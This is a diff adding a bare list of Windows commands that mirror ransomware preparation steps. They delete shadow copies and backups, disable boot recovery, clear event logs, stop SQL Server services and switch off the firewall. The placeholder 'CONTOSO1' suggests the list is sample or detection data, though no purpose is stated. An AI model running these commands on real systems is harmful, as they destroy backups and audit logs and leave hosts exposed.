@@ -1,0 +1,23 @@
+vssadmin.exe Delete Shadows /All /Quiet
+bcdedit.exe /set {default} recoveryenabled No
+bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
+wbadmin.exe DELETE SYSTEMSTATEBACKUP
+wbadmin.exe DELETE SYSTEMSTATEBACKUP –deleteOldest
+wbadmin.exe delete catalog –quiet
+wbadmin.exe delete backup
+wbadmin.exe delete systemstatebackup -keepversions:0
+wevtutil.exe clear-log Application
+wevtutil.exe clear-log Security
+wevtutil.exe clear-log System
+wevtutil.exe clear-log "windows powershell"
+wmic.exe SHADOWCOPY /nointeractive
+net.exe stop MSDTC
+net.exe stop SQLSERVERAGENT
+net.exe stop MSSQLSERVER
+net.exe stop vds
+net.exe stop SQLWriter
+net.exe stop SQLBrowser
+net.exe stop MSSQLSERVER
+net.exe stop MSSQL$CONTOSO1
+netsh.exe advfirewall set currentprofile state off
+netsh.exe firewall set opmode mode=disable
